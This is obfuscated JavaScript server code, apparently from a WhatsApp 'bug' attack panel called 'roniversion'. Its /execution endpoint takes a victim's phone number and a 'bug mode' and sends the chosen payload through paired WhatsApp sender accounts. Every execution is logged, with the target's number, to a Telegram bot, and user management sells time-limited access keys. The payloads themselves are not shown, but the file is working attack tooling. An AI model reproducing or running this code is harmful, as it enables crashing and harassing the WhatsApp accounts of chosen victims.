        message: "𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: " + _0x1268f9.toUpperCase() + " - Completed - " + _0x2d0a1b
      }, false, _0x1f7105, "", _0x1268f9));
    }
    const _0x4d37f5 = _0x51e222();
    const _0x32178a = _0x4d37f5[_0x5f0182] || [];
    const _0xa0cd0d = _0x32178a.filter(_0x296bd1 => _0x3de425.has(_0x296bd1));
    return _0x317808.send(_0x174e84("🟥 Ready", {
      message: "Masukkan nomor target dan pilih mode bug",
      activeSenders: _0xa0cd0d
    }, true, _0x1f7105, "", _0x1268f9));
  } catch (_0x1f1069) {
    console.error("❌ Fatal error di /execution:", _0x1f1069);
    return _0x317808.status(500).send("Internal Server Error");
  }
});
_0x556fad.post("/execution", _0x4028eb, async (_0x254d31, _0x28d307) => {
  try {
    const _0x25e2d6 = _0x254d31.cookies.sessionUser;
    const {
      target: _0x5f3fcf,
      mode: _0x56ce3e
    } = _0x254d31.body;
    if (!_0x5f3fcf || !_0x56ce3e) {
      return _0x28d307.status(400).json({
        success: false,
        error: "⚠️ Target dan mode harus diisi"
      });
    }
    const _0x19d827 = _0x5b96e1(_0x5f3fcf);
    if (!_0x19d827.isValid) {
      const _0x1ba52f = {
        success: false,
        error: "❌ " + _0x19d827.message
      };
      return _0x28d307.status(400).json(_0x1ba52f);
    }
    const _0x2a6285 = _0x19d827.cleanNumber;
    const _0x2e3c2b = _0x19d827.country || _0x1031b2(_0x2a6285);
    if (_0x2a6285.length < 7 || _0x2a6285.length > 17) {
      return _0x28d307.status(400).json({
        success: false,
        error: "❌ Panjang nomor harus 7-17 digit"
      });
    }
    const _0x24a84b = _0x51e222();
    const _0x5b2736 = _0x24a84b[_0x25e2d6] || [];
    const _0x2e42ea = _0x5b2736.filter(_0x2d37f2 => _0x3de425.has(_0x2d37f2));
    if (_0x2e42ea.length === 0) {
      return _0x28d307.status(400).json({
        success: false,
        error: "📵 Tidak ada sender aktif. Silakan tambahkan sender terlebih dahulu."
      });
    }
    const _0x4cc788 = Object.keys(_0x18195b);
    if (!_0x4cc788.includes(_0x56ce3e)) {
      return _0x28d307.status(400).json({
        success: false,
        error: "⚙️ Mode '" + _0x56ce3e + "' tidak valid. Pilih: " + _0x4cc788.join(", ")
      });
    }
    const _0x1849b4 = _0x2e42ea[0];
    const _0x5a3ab2 = _0x3de425.get(_0x1849b4);
    if (!_0x5a3ab2) {
      return _0x28d307.status(400).json({
        success: false,
        error: "🔌 Sender tidak aktif. Periksa koneksi sender."
      });
    }
    const _0x200481 = _0x2a6285 + "@s.whatsapp.net";
    let _0x276b42;
    let _0x13420d = "";
    try {
      console.log(_0x17147b.green.bold("\n[TR4SH CORE] 🚀 User: " + _0x25e2d6 + "\nMode: " + _0x56ce3e + "\nTarget: " + _0x2a6285 + " (" + _0x2e3c2b + ")\n"));
      const _0x2c9c89 = _0x18195b[_0x56ce3e];
      if (_0x2c9c89) {
        _0x13420d = _0x2c9c89.name;
        _0x276b42 = await _0x2c9c89.execute(_0x5a3ab2, _0x200481);
      } else {
        throw new Error("Action " + _0x56ce3e + " not found");
      }
      const _0x5b9983 = "\n<blockquote>⚡ <b>NEW EXECUTION - " + _0x2e3c2b.toUpperCase() + "</b></blockquote>\n\n👤 <b>User:</b> <code>" + _0x25e2d6 + "</code>\n📞 <b>Sender:</b> <code>" + _0x1849b4 + "</code>\n🎯 <b>Target:</b> <code>" + _0x2a6285 + "</code> (" + _0x2e3c2b + ")\n📱 <b>Mode:</b> " + _0x13420d + "\n🔢 <b>Country Code:</b> " + _0x2a6285.substring(0, 3) + "...\n⏰ <b>Time:</b> " + new Date().toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta"
      }) + "\n✅ <b>Status:</b> SUCCESS - Sent to server\n\n<i>Powered by roni new version • Phone Helper Detection</i>";
      const _0x4aae04 = {
        chat_id: _0x1c68db,
        text: _0x5b9983,
        parse_mode: "HTML"
      };
      _0x1bb862.post("https://api.telegram.org/bot" + _0x5d5e5e + "/sendMessage", _0x4aae04).catch(_0x12b395 => console.error("❌ Gagal kirim log Telegram:", _0x12b395.message));
      _0x529c3a = Date.now();
      _0x28d307.json({
        success: true,
        message: "✅ Bug berhasil dikirim ke " + _0x2a6285,
        details: {
          target: _0x2a6285,
          mode: _0x56ce3e,
          bugName: _0x13420d,
          country: _0x2e3c2b,
          sender: _0x1849b4,
          timestamp: Date.now(),
          formattedTarget: "+" + _0x2a6285
        }
      });
    } catch (_0x5a8678) {
      console.error("[EXECUTION ERROR] User: " + _0x25e2d6 + " | Error:", _0x5a8678.message);
      const _0x127d47 = "\n<blockquote>❌ <b>EXECUTION FAILED</b></blockquote>\n\n👤 <b>User:</b> <code>" + _0x25e2d6 + "</code>\n🎯 <b>Target:</b> <code>" + _0x2a6285 + "</code> (" + _0x2e3c2b + ")\n📱 <b>Mode:</b> " + _0x13420d + "\n⚠️ <b>Error:</b> <code>" + _0x5a8678.message + "</code>\n⏰ <b>Time:</b> " + new Date().toLocaleString("id-ID");
      const _0xb9c637 = {
        chat_id: _0x1c68db,
        text: _0x127d47,
        parse_mode: "HTML"
      };
      _0x1bb862.post("https://api.telegram.org/bot" + _0x5d5e5e + "/sendMessage", _0xb9c637).catch(_0x41c5c2 => console.error("❌ Gagal kirim error log Telegram:", _0x41c5c2.message));
      const _0x27a509 = {
        success: false,
        error: "💥 Gagal mengeksekusi bug: " + _0x5a8678.message,
        suggestion: "Cek koneksi sender atau coba beberapa menit lagi"
      };
      _0x28d307.status(500).json(_0x27a509);
    }
  } catch (_0x2f0157) {
    console.error("❌ FATAL Error in POST /execution:", _0x2f0157);
    const _0x2d65e0 = "\n<blockquote>💀 <b>FATAL EXECUTION ERROR</b></blockquote>\n\n⚠️ <b>Error:</b> <code>" + _0x2f0157.message + "</code>\n📋 <b>Stack:</b> <code>" + _0x2f0157.stack?.substring(0, 200) + "...</code>\n⏰ <b>Time:</b> " + new Date().toLocaleString("id-ID");
    const _0x11d442 = {
      chat_id: _0x1c68db,
      text: _0x2d65e0,
      parse_mode: "HTML"
    };
    _0x1bb862.post("https://api.telegram.org/bot" + _0x5d5e5e + "/sendMessage", _0x11d442).catch(_0x529b21 => console.error("❌ Gagal kirim fatal log Telegram:", _0x529b21.message));
    _0x28d307.status(500).json({
      success: false,
      error: "🔥 Terjadi kesalahan internal server",
      details: "Tim developer telah diberitahu"
    });
  }
});
_0x556fad.get("/my-senders", _0x4028eb, (_0x2cd9a2, _0x397537) => {
  const _0x2ff685 = _0xaff847.join(__dirname, "!─☇𝐒𝐢𝐗", "sender.html");
  _0x131869.readFile(_0x2ff685, "utf8", (_0x1504eb, _0x399c00) => {
    if (_0x1504eb) {
      console.error("❌ Gagal membaca file sender.html:", _0x1504eb);
      return _0x397537.status(500).send("File sender.html tidak ditemukan");
    }
    _0x397537.send(_0x399c00);
  });
});
_0x556fad.get("/api/my-senders", _0x4028eb, (_0x190a79, _0x39ce8e) => {
  const _0x3bf532 = _0x190a79.cookies.sessionUser;
  const _0x26935c = _0x51e222();
  const _0x5c409d = _0x26935c[_0x3bf532] || [];
  const _0x538093 = {
    success: true,
    senders: _0x5c409d,
    total: _0x5c409d.length
  };
  _0x39ce8e.json(_0x538093);
});
_0x556fad.get("/api/events", _0x4028eb, (_0x495257, _0x2dd8ac) => {
  const _0x18b916 = _0x495257.cookies.sessionUser;
  _0x2dd8ac.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache",
    Connection: "keep-alive",
    "Access-Control-Allow-Origin": "*"
  });
  _0x28fb14.set(_0x18b916, _0x2dd8ac);
  const _0x123b76 = setInterval(() => {
    try {
      _0x2dd8ac.write(": heartbeat\n\n");
    } catch (_0x299f68) {
      clearInterval(_0x123b76);
    }
  }, 30000);
  _0x495257.on("close", () => {
    clearInterval(_0x123b76);
    _0x28fb14.delete(_0x18b916);
  });
  _0x2dd8ac.write("data: " + JSON.stringify({
    type: "connected",
    message: "Event stream connected"
  }) + "\n\n");
});
_0x556fad.post("/api/add-sender", _0x4028eb, async (_0x47af4e, _0x5c239d) => {
  const _0x4ccaad = _0x47af4e.cookies.sessionUser;
  const {
    number: _0x307f88
  } = _0x47af4e.body;
  if (!_0x307f88) {
    return _0x5c239d.json({
      success: false,
      error: "Nomor tidak boleh kosong"
    });
  }
  const _0x267645 = _0x307f88.replace(/\D/g, "");
  if (_0x267645.length < 7) {
    return _0x5c239d.json({
      success: false,
      error: "Nomor terlalu pendek"
    });
  }
  try {
    const _0x1baeb6 = _0x4a62f4(_0x4ccaad, _0x267645);
    _0x2d69f1(_0x4ccaad, _0x267645, _0x1baeb6).then(_0x31d3fa => {}).catch(_0x2038e2 => {
      console.error("[" + _0x4ccaad + "] ❌ Failed to connect sender " + _0x267645 + ":", _0x2038e2.message);
    });
    const _0x273250 = {
      success: true,
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: _0x267645,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    };
    _0x5c239d.json(_0x273250);
  } catch (_0x56e746) {
    console.error("[API] Error adding sender for " + _0x4ccaad + ":", _0x56e746);
    const _0x69e036 = {
      success: false,
      error: "Terjadi error saat memproses sender: " + _0x56e746.message
    };
    _0x5c239d.json(_0x69e036);
  }
});
_0x556fad.post("/api/delete-sender", _0x4028eb, async (_0x802dd0, _0x45f609) => {
  const _0x2c757f = _0x802dd0.cookies.sessionUser;
  const {
    number: _0x53470c
  } = _0x802dd0.body;
  if (!_0x53470c) {
    return _0x45f609.json({
      success: false,
      error: "Nomor tidak boleh kosong"
    });
  }
  try {
    const _0x1085ab = _0x51e222();
    if (_0x1085ab[_0x2c757f]) {
      _0x1085ab[_0x2c757f] = _0x1085ab[_0x2c757f].filter(_0x127fc4 => _0x127fc4 !== _0x53470c);
      _0x3575b9(_0x1085ab);
    }
    const _0x445ca4 = _0x4a62f4(_0x2c757f, _0x53470c);
    if (_0x131869.existsSync(_0x445ca4)) {
      _0x131869.rmSync(_0x445ca4, {
        recursive: true,
        force: true
      });
    }
    const _0x5de0e2 = {
      success: true,
      message: "Sender berhasil dihapus",
      number: _0x53470c
    };
    _0x45f609.json(_0x5de0e2);
  } catch (_0x1b2df5) {
    const _0x1df94e = {
      success: false,
      error: _0x1b2df5.message
    };
    _0x45f609.json(_0x1df94e);
  }
});
_0x556fad.get("/user-management", _0x4028eb, (_0x3b3c74, _0x4c19ca) => {
  const _0x4e6c8a = _0xaff847.join(__dirname, "!─☇𝐒𝐢𝐗", "user-management.html");
  _0x131869.readFile(_0x4e6c8a, "utf8", (_0x3be867, _0x4c0c0b) => {
    if (_0x3be867) {
      console.error("❌ Gagal membaca file user-management.html:", _0x3be867);
      return _0x4c19ca.status(500).send("File tidak ditemukan");
    }
    _0x4c19ca.send(_0x4c0c0b);
  });
});
_0x556fad.get("/api/users", _0x4028eb, (_0x2e20f9, _0x1eafa1) => {
  const _0x5cfe58 = _0x2e20f9.cookies.sessionUser;
  const _0x13361d = _0x2a638b();
  const _0x287f8d = _0x13361d.find(_0x249194 => _0x249194.username === _0x5cfe58);
  if (!_0x287f8d) {
    return _0x1eafa1.status(404).json({
      error: "User not found"
    });
  }
  let _0x59ae72 = [];
  if (_0x287f8d.role === "owner") {
    _0x59ae72 = _0x13361d;
  } else if (_0x287f8d.role === "admin") {
    _0x59ae72 = _0x13361d.filter(_0x4a3911 => _0x4a3911.role === "user");
  } else {
    return _0x1eafa1.status(403).json({
      error: "Forbidden"
    });
  }
  const _0x51c600 = _0x59ae72.map(_0x442991 => ({
    username: _0x442991.username,
    role: _0x442991.role,
    key: _0x287f8d.role === "owner" ? _0x442991.key : "********",
    expired: _0x442991.expired,
    status: Date.now() > _0x442991.expired ? "Expired" : "Active"
  }));
  const _0x1ffda1 = {
    success: true,
    users: _0x51c600
  };
  _0x1eafa1.json(_0x1ffda1);
});
_0x556fad.get("/api/user/:username", _0x4028eb, (_0x3aa995, _0x309ef6) => {
  const _0x4a3415 = _0x3aa995.cookies.sessionUser;
  const _0x2c9e64 = _0x3aa995.params.username;
  const _0x5c0810 = _0x2a638b();
  const _0x27ee2c = _0x5c0810.find(_0x4673b8 => _0x4673b8.username === _0x4a3415);
  const _0x3ecf9e = _0x5c0810.find(_0xaa54a3 => _0xaa54a3.username === _0x2c9e64);
  if (!_0x27ee2c || !_0x3ecf9e) {
    return _0x309ef6.json({
      success: false,
      error: "User not found"
    });
  }
  if (_0x27ee2c.role === "admin") {
    if (_0x3ecf9e.role !== "user") {
      return _0x309ef6.json({
        success: false,
        error: "Forbidden"
      });
    }
  }
  const _0x5345be = {
    username: _0x3ecf9e.username,
    role: _0x3ecf9e.role,
    key: _0x27ee2c.role === "owner" ? _0x3ecf9e.key : "********",
    expired: _0x3ecf9e.expired
  };
  const _0xb134a6 = {
    success: true,
    user: _0x5345be
  };
  _0x309ef6.json(_0xb134a6);
});
_0x556fad.post("/api/user", _0x4028eb, (_0x5f4eeb, _0x415e04) => {
  const _0x495e36 = _0x5f4eeb.cookies.sessionUser;
  const {
    username: _0x1e3d2a,
    role: _0x5be1af,
    key: _0x2da00a,
    duration: _0xdc4646
  } = _0x5f4eeb.body;
  const _0x184684 = _0x2a638b();
  const _0x46c77c = _0x184684.find(_0x35f2c0 => _0x35f2c0.username === _0x495e36);
  if (!_0x46c77c) {
    return _0x415e04.json({
      success: false,
      error: "User not found"
    });
  }
  if (_0x46c77c.role === "admin" && _0x5be1af !== "user") {
    return _0x415e04.json({
      success: false,
      error: "Admin can only create users"
    });
  }
  if (!["owner", "admin", "user"].includes(_0x5be1af)) {
    return _0x415e04.json({
      success: false,
      error: "Invalid role"
    });
  }
  if (_0x184684.find(_0x251186 => _0x251186.username === _0x1e3d2a)) {
    return _0x415e04.json({
      success: false,
      error: "Username already exists"
    });
  }
  let _0x2ecec5;
  if (_0xdc4646 === "permanent") {
    _0x2ecec5 = Date.now() + 315360000000;
  } else {
    const _0x28e38f = _0xd407b(_0xdc4646);
    if (!_0x28e38f) {
      return _0x415e04.json({
        success: false,
        error: "Invalid duration"
      });
    }
    _0x2ecec5 = Date.now() + _0x28e38f;
  }
  let _0x9ece83;
  if (_0x2da00a && _0x2da00a.trim() !== "") {
    _0x9ece83 = _0x2da00a.trim();
    if (_0x9ece83.length < 4) {
      return _0x415e04.json({
        success: false,
        error: "Key minimal 4 karakter"
      });
    }
    if (_0x184684.find(_0x9ea472 => _0x9ea472.key === _0x9ece83)) {
      return _0x415e04.json({
        success: false,
        error: "Key sudah digunakan, coba key lain"
      });
    }
  } else {
    _0x9ece83 = _0x45cf57(6);
  }
  const _0x5080c8 = {
    username: _0x1e3d2a,
    key: _0x9ece83,
    expired: _0x2ecec5,
    role: _0x5be1af,
    telegram_id: "",
    isLoggedIn: false,
    createdBy: _0x495e36,
    createdAt: Date.now()
  };
  _0x184684.push(_0x5080c8);
  _0x28fca2(_0x184684);
  const _0x4d4220 = {
    username: _0x5080c8.username,
    role: _0x5080c8.role,
    key: _0x5080c8.key,
    expired: _0x5080c8.expired
  };
  const _0x199b54 = {
    success: true,
    message: "User created successfully",
    user: _0x4d4220
  };
  _0x415e04.json(_0x199b54);
});
_0x556fad.put("/api/user/:username", _0x4028eb, (_0x45db56, _0x1a111b) => {
  const _0x583ece = _0x45db56.cookies.sessionUser;
  const _0x19d701 = _0x45db56.params.username;
  const {
    role: _0xf869bd,
    key: _0x1bacd3,
    duration: _0x6c09aa
  } = _0x45db56.body;
  const _0x101f19 = _0x2a638b();
  const _0x121c3d = _0x101f19.find(_0x47065f => _0x47065f.username === _0x583ece);
  const _0x6251d5 = _0x101f19.findIndex(_0x35c423 => _0x35c423.username === _0x19d701);
  if (!_0x121c3d || _0x6251d5 === -1) {
    return _0x1a111b.json({
      success: false,
      error: "User not found"
    });
  }
  const _0x14a3b5 = _0x101f19[_0x6251d5];
  if (_0x14a3b5.role === "owner") {
    return _0x1a111b.json({
      success: false,
      error: "Cannot edit user with owner role"
    });
  }
  if (_0x121c3d.role === "admin") {
    if (_0x14a3b5.role !== "user") {
      return _0x1a111b.json({
        success: false,
        error: "Forbidden"
      });
    }
    if (_0xf869bd && _0xf869bd !== "user") {
      return _0x1a111b.json({
        success: false,
        error: "Admin can only set role to 'user'"
      });
    }
  }
  if (_0xf869bd && ["owner", "admin", "user"].includes(_0xf869bd)) {
    if (_0xf869bd === "owner") {
      return _0x1a111b.json({
        success: false,
        error: "Cannot set role to owner via web interface"
      });
    }
    _0x101f19[_0x6251d5].role = _0xf869bd;
  }
  if (_0x1bacd3 && _0x1bacd3.trim() !== "" && _0x1bacd3.trim() !== _0x14a3b5.key) {
    const _0x270163 = _0x1bacd3.trim();
    if (_0x270163.length < 4) {
      return _0x1a111b.json({
        success: false,
        error: "Key minimal 4 karakter"
      });
    }
    if (_0x101f19.find(_0x20dabd => _0x20dabd.key === _0x270163 && _0x20dabd.username !== _0x19d701)) {
      return _0x1a111b.json({
        success: false,
        error: "Key sudah digunakan, coba key lain"
      });
    }
    _0x101f19[_0x6251d5].key = _0x270163;
  }
  if (_0x6c09aa) {
    if (_0x6c09aa === "permanent") {
      _0x101f19[_0x6251d5].expired = Date.now() + 315360000000;
    } else {
      const _0xb52507 = _0xd407b(_0x6c09aa);
      if (_0xb52507) {
        _0x101f19[_0x6251d5].expired = Date.now() + _0xb52507;
      }
    }
  }
  _0x28fca2(_0x101f19);
  _0x1a111b.json({
    success: true,
    message: "User updated successfully"
  });
});
_0x556fad.delete("/api/user/:username", _0x4028eb, (_0x515e43, _0xf7e700) => {
  const _0x3b3628 = _0x515e43.cookies.sessionUser;
  const _0x394310 = _0x515e43.params.username;
  const _0x41cf0e = _0x2a638b();
  const _0x275017 = _0x41cf0e.find(_0xcfccd6 => _0xcfccd6.username === _0x3b3628);
  const _0x5ee9cd = _0x41cf0e.find(_0x4b8c37 => _0x4b8c37.username === _0x394310);
  if (!_0x275017 || !_0x5ee9cd) {
    return _0xf7e700.json({
      success: false,
      error: "User not found"
    });
  }
  if (_0x5ee9cd.role === "owner") {
    return _0xf7e700.json({
      success: false,
      error: "Cannot delete user with owner role via web"
    });
  }
  if (_0x275017.role === "admin") {
    if (_0x5ee9cd.role !== "user") {
      return _0xf7e700.json({
        success: false,
        error: "Forbidden"
      });
    }
  }
  const _0x138ccd = _0x41cf0e.filter(_0x1aa32f => _0x1aa32f.username !== _0x394310);
  _0x28fca2(_0x138ccd);
  _0xf7e700.json({
    success: true,
    message: "User deleted successfully"
  });
});
_0x556fad.get("/api/session-check", (_0xd62297, _0x3f3f27) => {
  const _0x576178 = _0xd62297.cookies.sessionUser;
  const _0x3ff082 = _0xd62297.cookies.sessionId;
  if (!_0x576178 || !_0x3ff082) {
    return _0x3f3f27.status(401).json({
      error: "No session"
    });
  }
  const _0x35a255 = _0x55cb79.get(_0x576178);
  if (!_0x35a255 || _0x35a255.sessionId !== _0x3ff082) {
    return _0x3f3f27.status(403).json({
      error: "Invalid session"
    });
  }
  const _0x446036 = {
    valid: true,
    username: _0x576178
  };
  _0x3f3f27.json(_0x446036);
});
_0x556fad.get("/api/session-heartbeat", _0x4028eb, (_0x5032a4, _0x1fa0be) => {
  _0x1fa0be.json({
    success: true,
    timestamp: Date.now()
  });
});
_0x556fad.get("/logout", (_0x24600c, _0x246e7b) => {
  const _0x2bf9fe = _0x24600c.cookies.sessionUser;
  if (_0x2bf9fe) {
    _0x55cb79.delete(_0x2bf9fe);
    _0x95dde8();
  }
  const _0x356d61 = _0x24600c.cookies.sessionId;
  if (_0x356d61) {
    for (const [_0x192fbb, _0x2e3db6] of _0x55cb79.entries()) {
      if (_0x2e3db6.sessionId === _0x356d61) {
        _0x55cb79.delete(_0x192fbb);
        console.log("[LOGOUT] Also removed " + _0x192fbb + " by sessionId match");
        break;
      }
    }
  }
  const _0x380690 = {
    path: "/",
    httpOnly: true,
    expires: new Date(0)
  };
  _0x246e7b.clearCookie("sessionUser", _0x380690);
  _0x246e7b.clearCookie("sessionId", _0x380690);
  _0x246e7b.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, private, max-age=0");
  _0x246e7b.setHeader("Pragma", "no-cache");
  _0x246e7b.setHeader("Expires", "Thu, 01 Jan 1970 00:00:00 GMT");
  _0x246e7b.setHeader("X-Accel-Expires", "0");
  const _0x5c2d09 = "\n    <!DOCTYPE html>\n    <html>\n    <head>\n        <title>Logging out...</title>\n        <meta http-equiv=\"Cache-Control\" content=\"no-cache, no-store, must-revalidate\">\n        <meta http-equiv=\"Pragma\" content=\"no-cache\">\n        <meta http-equiv=\"Expires\" content=\"0\">\n        <script>\n            localStorage.removeItem('indictive_username');\n            localStorage.removeItem('indictive_password');\n            \n            document.cookie = \"sessionUser=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\";\n            document.cookie = \"sessionId=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\";\n            \n            window.history.replaceState(null, null, window.location.href);\n            \n            setTimeout(function() {\n                window.location.href = '/login?msg=' + encodeURIComponent('Logout berhasil') + '&t=' + Date.now();\n            }, 500);\n        </script>\n    </head>\n    <body style=\"background: #1515eeff; color: white; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh;\">\n        <div style=\"text-align: center;\">\n            <div style=\"font-size: 24px; margin-bottom: 20px; color: #080808ff;\">🔐</div>\n            <div>Logging out...</div>\n            <div style=\"font-size: 12px; color: #9ca3af; margin-top: 10px;\">Cleaning session data...</div>\n        </div>\n    </body>\n    </html>";
  _0x246e7b.send(_0x5c2d09);
});
_0x556fad.post("/api/logout-other-device", async (_0x374293, _0xa21aa9) => {
  try {
    const {
      username: _0x57ffe8,
      password: _0x15a1c8
    } = _0x374293.body;
    const _0x2a632f = _0x2a638b();
    const _0x83f7d9 = _0x2a632f.find(_0x5659e7 => _0x5659e7.username === _0x57ffe8 && _0x5659e7.key === _0x15a1c8);
    if (!_0x83f7d9) {
      return _0xa21aa9.json({
        success: false,
        error: "Invalid credentials"
      });
    }
    _0x55cb79.delete(_0x57ffe8);
    _0x95dde8();
    _0xa21aa9.json({
      success: true,
      message: "Other device logged out successfully"
    });
  } catch (_0x7d88c4) {
    console.error("Logout other device error:", _0x7d88c4);
    _0xa21aa9.json({
      success: false,
      error: "Internal server error"
    });
  }
});
_0x556fad.get("/profile", _0x4028eb, (_0x2eb5a2, _0x5ec178) => {
  const _0x1201f7 = _0xaff847.join(__dirname, "!─☇𝐒𝐢𝐗", "profil.html");
  _0x131869.readFile(_0x1201f7, "utf8", (_0x2b6f94, _0x525287) => {
    if (_0x2b6f94) {
      return _0x5ec178.status(500).send("❌ File tidak ditemukan");
    }
    _0x5ec178.send(_0x525287);
  });
});
_0x556fad.get("/my-support", _0x4028eb, (_0x385133, _0x2aef3b) => {
  const _0x462c1d = _0xaff847.join(__dirname, "!─☇𝐒𝐢𝐗", "my-supports.html");
  _0x131869.readFile(_0x462c1d, "utf8", (_0x3ca1ff, _0x50566b) => {
    if (_0x3ca1ff) {
      return _0x2aef3b.status(500).send("❌ File tidak ditemukan");
    }
    _0x2aef3b.send(_0x50566b);
  });
});
const _0x1393e2 = require("figlet");
const _0x135822 = require("gradient-string");
const _0x3a09cd = require("boxen");
const _0x4c9b5b = require("ora");
function _0x17ea8f() {
  console.clear();
  _0x1393e2("roniversion", {
    font: "Standard"
  }, (_0x546d40, _0x3dd8eb) => {
    if (_0x546d40) {
      return;
    }
    console.log(_0x135822.pastel.multiline(_0x3dd8eb));
    const _0x86175c = "@ronisirr";
    const _0x572bfd = ["@robllokk"];
    const _0x2771b2 = ("\nAuthor    : " + _0x86175c + "\nVersion   : 6.0.0\nOwner ID  : " + _0x572bfd.join(", ") + "\nStatus    : Active\n        ").trim();
    console.log(_0x3a09cd(_0x2771b2, {
      padding: 1,
      margin: 0,
      borderStyle: "round",
      borderColor: "cyan",
      title: "System Information",
      titleAlignment: "center"
    }));
    console.log("\n");
    console.table({
      Apps: "roniversion",
      Type: "web2app",
      Version: 6
    });
    console.log("\n");
    const _0x25bf79 = _0x4c9b5b({
      text: "Initializing roni version modules...",
      spinner: {
        interval: 80,
        frames: ["⏤    ", " ⏤⏤   ", "  ⏤⏤⏤ ", "   ⏤⏤⏤", "    ⏤⏤", "     ⏤"]
      }
    }).start();
    setTimeout(() => {
      _0x25bf79.text = "Connecting to database...";
      _0x25bf79.color = "yellow";
    }, 2000);
    setTimeout(() => {
      _0x25bf79.succeed(_0x17147b.yellow("System ready. roniversion is now online!"));
      _0x25bf79.succeed(_0x17147b.blue("Klick your domain here. " + _0x10a471 + ":" + _0xb0bfe8));
      console.log(_0x17147b.green("┌────────────────────────────────────┐\n│           roniversion            │\n└────────────────────────────────────┘"));
      console.log(_0x17147b.dim("Waiting for messages..."));
      _0x337bc3.launch();
    }, 3000);
  });
}
_0x17ea8f();
setInterval(() => {
  const _0x46d526 = _0xaff847.join(__dirname, "database", "sessions.json") + ".backup-" + new Date().toISOString().split("T")[0];
  try {
    const _0x4e945e = _0xaff847.join(__dirname, "database", "sessions.json");
    if (_0x131869.existsSync(_0x4e945e)) {
      _0x131869.copyFileSync(_0x4e945e, _0x46d526);
    }
  } catch (_0x413084) {
    console.error("[BACKUP] Failed to backup sessions:", _0x413084);
  }
}, 86400000);
setInterval(() => {
  const _0x3b4112 = _0x3de425.size;
  const _0x4ab06e = _0x51e222();
  const _0x5ca291 = Object.values(_0x4ab06e).reduce((_0x8a1b01, _0x542163) => _0x8a1b01 + _0x542163.length, 0);
  console.log("📊 Health Check: " + _0x3b4112 + "/" + _0x5ca291 + " sessions active");
  if (_0x5ca291 > 0 && _0x3b4112 === 0) {
    _0x382791 = 0;
    _0xc8c7ac();
  } else if (_0x3b4112 > 0) {
    console.log("✅ Health check: Sessions are active");
  }
}, 600000);
setInterval(_0x28ab50, 3600000);
setTimeout(_0x28ab50, 5000);
_0x556fad.listen(_0xb0bfe8, () => {
  console.log(_0x17147b.green("✓ Server sudah aktif"));
});
const _0x174e84 = (_0x3a3f94 = "🟥 Ready", _0x53329c = {}, _0x54c909 = true, _0x47d641 = {}, _0x14e6d6 = "", _0x2bead1 = "") => {
  const {
    username: _0x3d631c,
    expired: _0x375e41
  } = _0x47d641;
  const _0x1b5f3f = _0x375e41 ? new Date(_0x375e41).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "2-digit",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit"
  }) : "-";
  return "<!DOCTYPE html>\n<html lang=\"id\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n    <title>roni new version - Execution</title>\n    \n    <!-- Load Font Share Tech Mono -->\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n    <link href=\"https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap\" rel=\"stylesheet\">\n    \n    <!-- FontAwesome (Tetap disimpan untuk ikon lain) -->\n    <link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css\">\n\n    <style>\n        /* --- VARIABLES --- */\n        :root {\n            --bg-dark: #680affff;       \n            --bg-gradient: radial-gradient(circle at 50% 0%, #024affff 0%, #000000ff 80%);\n            \n            --accent-pink: #ff00b3ff;   \n            --accent-purple: #7703ebff; \n            --accent-green: #dc08efff;\n            \n            --text-gray: #9611caff; \n            --font-main: 'Share Tech Mono', monospace;\n        }\n\n        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }\n        \n        body {\n            background-color: var(--bg-dark);\n            background-image: var(--bg-gradient);\n            color: #ff0505ff;\n            font-family: var(--font-main);\n            min-height: 100vh;\n            display: flex;\n            flex-direction: column;\n            overflow-x: hidden;\n            letter-spacing: 0.5px;\n        }\n\n        .container {\n            width: 100%;\n            max-width: 450px;\n            margin: 0 auto;\n            padding-bottom: 110px; \n            position: relative;\n        }\n\n        /* --- HEADER --- */\n        header {\n            display: flex;\n            justify-content: space-between;\n            align-items: center;\n            padding: 20px 24px; \n            background: rgba(8, 3, 16, 0.95);\n            z-index: 50;\n            border-bottom: 1px solid rgba(0, 0, 0, 1);\n        }\n\n        .header-left { display: flex; align-items: center; gap: 15px; }\n\n        /* SVG Menu Button Style */\n        .menu-btn {\n            cursor: pointer;\n            color: white;\n            transition: transform 0.2s;\n        }\n        .menu-btn:active {\n            transform: scale(0.9);\n            color: var(--accent-pink);\n        }\n\n        .brand-title {\n            font-size: 20px; \n            font-weight: 400;\n            letter-spacing: 1.5px;\n            color: #00b7ffff;\n            text-shadow: 0 0 10px rgba(12, 12, 12, 0.82);\n        }\n\n        /* --- MAIN CONTENT --- */\n        main {\n            padding: 20px 24px; \n            display: flex;\n            flex-direction: column;\n            gap: 20px; \n        }\n\n        /* === USER CARD === */\n        .user-card {\n            width: 100%;\n            height: 95px; \n            border-radius: 16px;\n            border: 1px solid rgba(255, 0, 255, 1);\n            box-shadow: 0 4px 15px rgba(178, 17, 253, 0.86);\n            background: linear-gradient(135deg, rgba(0, 0, 0, 1) 0%, rgba(147, 51, 234, 0.15) 100%);\n            display: flex;\n            align-items: center; \n            padding: 0 16px; \n        }\n\n        .user-card-content {\n            width: 100%;\n            display: flex;\n            align-items: center; \n            gap: 14px;\n        }\n\n        .profile-photo {\n            width: 60px; \n            height: 60px;\n            border-radius: 50%;\n            border: 3px solid rgba(255, 255, 255, 0.2);\n            overflow: hidden;\n            flex-shrink: 0;\n            box-shadow: 0 2px 8px rgba(50, 5, 248, 0.3);\n        }\n\n    